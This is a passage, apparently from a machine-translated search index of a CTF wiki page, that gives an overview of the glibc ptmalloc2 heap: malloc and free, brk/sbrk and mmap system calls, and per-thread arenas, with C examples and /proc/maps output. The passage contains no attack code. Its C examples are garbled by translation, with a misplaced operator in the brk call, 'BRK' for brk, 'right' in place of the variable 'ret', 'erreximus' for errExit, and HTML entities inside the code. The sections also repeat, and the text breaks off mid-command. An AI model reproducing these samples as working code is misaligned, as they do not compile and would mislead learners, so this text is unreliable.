Therefore, for security, when a thread uses a heap, it locks. At the same time, however, locking can cause other threads to be unable to use the heap, reducing the efficiency of memory allocation and reclamation. At the same time, if it is not properly controlled when it is used by multiple threads, it may affect the correctness of memory allocation and recycling. Wolfram Gloger has been improved on top of Doug Lea to support multithreading. This heap allocator is ptmalloc. After glibc-2.3.x., ptmalloc2 is integrated in glibc. The heap allocator currently used in the Linux standard distribution is the heap allocator in glibc: ptmalloc2. Ptmalloc2 mainly allocates and frees memory blocks through the malloc/free function. It should be noted that in the process of memory allocation and use, Linux has such a basic memory management idea, only when a real address is accessed, the system will establish a mapping relationship between virtual pages and physical pages . So although the operating system has allocated a large chunk of memory to the program, this memory is actually just virtual memory. Only when the user uses the corresponding memory will the system actually allocate the physical page to the user. heap basic operations \u00b6 Here we mainly introduce Basic heap operations, including heap allocation, reclamation, system calls behind heap allocation Introducing the current multithreading support for the heap. malloc \u00b6 In glibc's [malloc.c] ( https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448 ), the description of malloc is as follows /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ As you can see, the malloc function returns a pointer to the memory block of the corresponding size byte. In addition, the function also handles some exceptions. When n=0, returns the smallest memory block of the heap allowed by the current system. When n is negative, since size_t is an unsigned number (which is very important) on most systems, the program will apply for a large amount of memory, but usually it will fail because the system Not so much memory can be allocated. free \u00b6 In glibc's [malloc.c] ( https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465 ), the description of free is as follows /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ As you can see, the free function releases the memory block pointed to by p. This memory block may be obtained through the malloc function, or it may be obtained through the related function realloc. In addition, this function also handles exceptions. When p is a null pointer, the function does nothing. When p has been released, releasing it again will have a messy effect, which is actually double free . In addition to being disabled (mallopt), when a large amount of memory is freed, the program will return the memory to the system in order to reduce the memory space used by the program. System call behind memory allocation \u00b6 In the functions mentioned above, whether it is malloc function or free function, we use it frequently when we apply and release memory dynamically, but they are not functions that really interact with the system. The system calls behind these functions are mainly (s)brk functions and mmap, munmap function. As shown in the following figure, we mainly consider the operation of applying for a memory block to the heap. (s) brk \u00b6 For heap operations, the operating system provides brk functions, and the glibc library provides sbrk functions. We can request memory from the operating system by increasing the size of [brk] ( https://en.wikipedia.org/wiki/Sbrk ). Initially, the starting address of the heap [start_brk] ( http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365 ) and the current end of the heap [brk] ( http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365 ) Point to the same address. The exact location of the two will vary depending on whether ASLR is turned on. When ASLR protection is not enabled, start_brk and brk point to the end of the data/bss section. When ASLR protection is turned on, start_brk and brk also point to the same location, except that this location is at a random offset after the end of the data/bss section. The specific effect is as follows (this picture is basically the same as that spread on the Internet, here is because you have to draw a large picture, so you have drawn it separately) example /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( + curr_brk 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); BRK ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } It should be noted that the getchar() function is executed after each execution, which is for us to see the true mapping of the program. Before the first call to brk As you can see from the output below, there is no heap. therefore start_brk = brk = end_data = 0x804b000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ After adding brk for the first time As you can see from the output below, the heap segment has appeared. start_brk = end_data = 0x804b000 brk = 0x804c000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 Program Break Location2:0x804c000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk 0804b000-0804c000 rw-p 00000000 00 :00 0 [ heap ] b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ Among them, the row about the heap 0x0804b000 is the starting address of the corresponding heap rw-p indicates that the heap has read and write permissions and is private data. 00000000 indicates a file offset, which is 0 because this part of the content is not mapped from the file. 00:00 is the device number of the master/slave (Major/mirror). This part of the content is not mapped from the file, so it is also 0. 0 indicates the Inode number. Since this part of the content is not mapped from the file, it is 0. mmap \u00b6 Malloc will use [mmap] ( http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285 ) to create a separate anonymous map segment. The purpose of anonymous mapping is mainly to apply for memory filled with 0, and this memory is only used by the calling process. example /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( -1 ); } int main () { int right = -1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( right == -1 ) erreximus ( & quot ; munmap & quot ;); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } Before executing mmap We can see from the output below that there is currently only the mmap segment of the .so file. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap after As can be seen from the output below, the memory we applied for is combined with the existing memory segment to form the mmap segment of b7e00000 to b7e21000. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap From the output below, we can see that the memory segment we originally applied has disappeared, and the memory segment has returned to its original state. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ Multi-threading support \u00b6 In the original dlmalloc implementation, when two threads were simultaneously requesting memory, only one thread could enter the critical section to apply for memory, while another thread had to wait until there were no more threads in the critical section. This is because all threads share a heap. In gmbc's ptmalloc implementation, a better point is to support multi-threaded fast access. In the new implementation, all threads share multiple heaps. Here is an example. /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void * threadFunc ( void * arg ) { printf ( \"Before malloc in thread 1 \\n \" ); getchar (); char * addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in thread 1 \\n \" ); getchar (); free ( addr ); printf ( \"After free in thread 1 \\n \" ); getchar (); } int main () { pthread_t t1 ; void * s ; int right ; char * addr ; printf ( \"Welcome to per thread arena example::%d \\n \" , getpid ()); printf ( \"Before malloc in main thread \\n \" ); getchar (); addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in main thread \\n \" ); getchar (); free ( addr ); printf ( \"After free in main thread \\n \" ); getchar (); ret = pthread_create ( & t1 , NULL , threadFunc , NULL ); if ( right ) { printf ( \"Thread creation error \\n \" ); return -1 ; } ret = pthread_join ( t1 , & s ); if ( right ) { printf ( \"Thread join error \\n \" ); return -1 ; } return 0 ; } Before the first application , there are no piles. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ After the first application , as you can see from the output below, the heap segment is created and it is next to the data segment, which means that the malloc is implemented with the brk function. At the same time, it should be noted that although we only applied for 1000 bytes, we got a heap of 0x0806c000-0x0804b000=0x21000 bytes. This means that although the program may only request a small amount of memory from the operating system, for convenience, the operating system allocates a large amount of memory to the program. In this case, the switching between the kernel state and the user state is avoided, and the efficiency of the program is improved. We call this contiguous memory area as arena. In addition, we call the memory requested by the main thread as main_arena. The memory of subsequent applications will always be obtained from this arena until there is not enough space. When there is not enough space in the arena, it can increase the heap space by adding brk. Similarly, arena can also shrink its space by reducing brk. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ** After the main thread releases the memory, we can see from the output below that the corresponding arena is not recycled, but is managed by glibc. When the later program requests memory again, glibc allocates the corresponding memory to the program according to the heap allocation algorithm when the memory managed by glibc is sufficient. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ Before the first thread malloc , we can see that there is no heap associated with thread 1, but there is a stack associated with thread 1. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ The first thread after malloc , we can see from the output below that the heap segment of thread 1 was created. And its location is the memory mapped segment area, the same size is also 132KB (b7500000-b7521000). So this indicates that the corresponding function behind the thread is the mmap function. At the same time, we can see that the actual memory allocated to the program is 1M (b7500000-b7600000). Moreover, only 132KB of the part has readable and writable permissions, and this contiguous area becomes the thread arena. note: > When the memory requested by the user is greater than 128KB, and no arena has enough space, then the system will execute the mmap function to allocate the corresponding memory space. This is independent of whether the request comes from the main thread or from the thread. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ** After the first thread releases the memory, we can see from the output below that releasing the memory will not re-send the memory to the system. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ references \u00b6 sploitfun","title":"Heap Overview"},{"location":"pwn/linux/glibc-heap/heap_overview/#overview","text":"","title":"\u5806 overview"},{"location":"pwn/linux/glibc-heap/heap_overview/#what-is-a-heap","text":"The heap can provide dynamically allocated memory while the program is running, allowing the program to request memory of unknown size. The heap is actually a continuous linear region of the program virtual address space, which grows from a low address to a high address. We generally refer to the part of the program that manages the heap as the heap manager. The heap manager is in the middle of the user program and the kernel, mainly doing the following work. In response to the user's request for a memory request, request memory from the operating system and return it to the user program. At the same time, in order to maintain the efficiency of memory management, the kernel generally pre-allocates a large piece of contiguous memory, and then let the heap manager manage the memory through some algorithm. The heap manager will interact with the operating system again only if there is insufficient heap space. Manage the memory released by the user. In general, the memory released by the user is not directly returned to the operating system, but is managed by the heap manager. These released memory can respond to requests from the user for newly requested memory. Early heap allocation and reclamation in Linux was implemented by Doug Lea, but it shared the heap memory space of the process when it processed multiple threads in parallel. Therefore, for security, when a thread uses a heap, it locks. At the same time, however, locking can cause other threads to be unable to use the heap, reducing the efficiency of memory allocation and reclamation. At the same time, if it is not properly controlled when it is used by multiple threads, it may affect the correctness of memory allocation and recycling. Wolfram Gloger has been improved on top of Doug Lea to support multithreading. This heap allocator is ptmalloc. After glibc-2.3.x., ptmalloc2 is integrated in glibc. The heap allocator currently used in the Linux standard distribution is the heap allocator in glibc: ptmalloc2. Ptmalloc2 mainly allocates and frees memory blocks through the malloc/free function. It should be noted that in the process of memory allocation and use, Linux has such a basic memory management idea, only when a real address is accessed, the system will establish a mapping relationship between virtual pages and physical pages . So although the operating system has allocated a large chunk of memory to the program, this memory is actually just virtual memory. Only when the user uses the corresponding memory will the system actually allocate the physical page to the user.","title":"What is a heap?"},{"location":"pwn/linux/glibc-heap/heap_overview/#heap-basic-operations","text":"Here we mainly introduce Basic heap operations, including heap allocation, reclamation, system calls behind heap allocation Introducing the current multithreading support for the heap.","title":"heap basic operations"},{"location":"pwn/linux/glibc-heap/heap_overview/#malloc","text":"In glibc's [malloc.c] ( https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448 ), the description of malloc is as follows /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ As you can see, the malloc function returns a pointer to the memory block of the corresponding size byte. In addition, the function also handles some exceptions. When n=0, returns the smallest memory block of the heap allowed by the current system. When n is negative, since size_t is an unsigned number (which is very important) on most systems, the program will apply for a large amount of memory, but usually it will fail because the system Not so much memory can be allocated.","title":"malloc"},{"location":"pwn/linux/glibc-heap/heap_overview/#free","text":"In glibc's [malloc.c] ( https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465 ), the description of free is as follows /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ As you can see, the free function releases the memory block pointed to by p. This memory block may be obtained through the malloc function, or it may be obtained through the related function realloc. In addition, this function also handles exceptions. When p is a null pointer, the function does nothing. When p has been released, releasing it again will have a messy effect, which is actually double free . In addition to being disabled (mallopt), when a large amount of memory is freed, the program will return the memory to the system in order to reduce the memory space used by the program.","title":"free"},{"location":"pwn/linux/glibc-heap/heap_overview/#system-call-behind-memory-allocation","text":"In the functions mentioned above, whether it is malloc function or free function, we use it frequently when we apply and release memory dynamically, but they are not functions that really interact with the system. The system calls behind these functions are mainly (s)brk functions and mmap, munmap function. As shown in the following figure, we mainly consider the operation of applying for a memory block to the heap.","title":"System call behind memory allocation"},{"location":"pwn/linux/glibc-heap/heap_overview/#s-brk","text":"For heap operations, the operating system provides brk functions, and the glibc library provides sbrk functions. We can request memory from the operating system by increasing the size of [brk] ( https://en.wikipedia.org/wiki/Sbrk ). Initially, the starting address of the heap [start_brk] ( http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365 ) and the current end of the heap [brk] ( http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365 ) Point to the same address. The exact location of the two will vary depending on whether ASLR is turned on. When ASLR protection is not enabled, start_brk and brk point to the end of the data/bss section. When ASLR protection is turned on, start_brk and brk also point to the same location, except that this location is at a random offset after the end of the data/bss section. The specific effect is as follows (this picture is basically the same as that spread on the Internet, here is because you have to draw a large picture, so you have drawn it separately) example /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( + curr_brk 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); BRK ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } It should be noted that the getchar() function is executed after each execution, which is for us to see the true mapping of the program. Before the first call to brk As you can see from the output below, there is no heap. therefore start_brk = brk = end_data = 0x804b000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ After adding brk for the first time As you can see from the output below, the heap segment has appeared. start_brk = end_data = 0x804b000 brk = 0x804c000 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk Welcome to sbrk example:6141 Program Break Location1:0x804b000 Program Break Location2:0x804c000 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps ... 0804a000-0804b000 rw-p 00001000 08 :01 539624 /home/sploitfun/ptmalloc.ppt/syscalls/sbrk 0804b000-0804c000 rw-p 00000000 00 :00 0 [ heap ] b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ Among them, the row about the heap 0x0804b000 is the starting address of the corresponding heap rw-p indicates that the heap has read and write permissions and is private data. 00000000 indicates a file offset, which is 0 because this part of the content is not mapped from the file. 00:00 is the device number of the master/slave (Major/mirror). This part of the content is not mapped from the file, so it is also 0. 0 indicates the Inode number. Since this part of the content is not mapped from the file, it is 0.","title":"(s) brk"},{"location":"pwn/linux/glibc-heap/heap_overview/#mmap","text":"Malloc will use [mmap] ( http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285 ) to create a separate anonymous map segment. The purpose of anonymous mapping is mainly to apply for memory filled with 0, and this memory is only used by the calling process. example /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( -1 ); } int main () { int right = -1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( right == -1 ) erreximus ( & quot ; munmap & quot ;); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } Before executing mmap We can see from the output below that there is currently only the mmap segment of the .so file. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap after As can be seen from the output below, the memory we applied for is combined with the existing memory segment to form the mmap segment of b7e00000 to b7e21000. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmapb7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap From the output below, we can see that the memory segment we originally applied has disappeared, and the memory segment has returned to its original state. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$","title":"mmap"},{"location":"pwn/linux/glibc-heap/heap_overview/#multi-threading-support","text":"In the original dlmalloc implementation, when two threads were simultaneously requesting memory, only one thread could enter the critical section to apply for memory, while another thread had to wait until there were no more threads in the critical section. This is because all threads share a heap. In gmbc's ptmalloc implementation, a better point is to support multi-threaded fast access. In the new implementation, all threads share multiple heaps. Here is an example. /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void * threadFunc ( void * arg ) { printf ( \"Before malloc in thread 1 \\n \" ); getchar (); char * addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in thread 1 \\n \" ); getchar (); free ( addr ); printf ( \"After free in thread 1 \\n \" ); getchar (); } int main () { pthread_t t1 ; void * s ; int right ; char * addr ; printf ( \"Welcome to per thread arena example::%d \\n \" , getpid ()); printf ( \"Before malloc in main thread \\n \" ); getchar (); addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in main thread \\n \" ); getchar (); free ( addr ); printf ( \"After free in main thread \\n \" ); getchar (); ret = pthread_create ( & t1 , NULL , threadFunc , NULL ); if ( right ) { printf ( \"Thread creation error \\n \" ); return -1 ; } ret = pthread_join ( t1 , & s ); if ( right ) { printf ( \"Thread join error \\n \" ); return -1 ; } return 0 ; } Before the first application , there are no piles. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ After the first application , as you can see from the output below, the heap segment is created and it is next to the data segment, which means that the malloc is implemented with the brk function. At the same time, it should be noted that although we only applied for 1000 bytes, we got a heap of 0x0806c000-0x0804b000=0x21000 bytes. This means that although the program may only request a small amount of memory from the operating system, for convenience, the operating system allocates a large amount of memory to the program. In this case, the switching between the kernel state and the user state is avoided, and the efficiency of the program is improved. We call this contiguous memory area as arena. In addition, we call the memory requested by the main thread as main_arena. The memory of subsequent applications will always be obtained from this arena until there is not enough space. When there is not enough space in the arena, it can increase the heap space by adding brk. Similarly, arena can also shrink its space by reducing brk. sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat 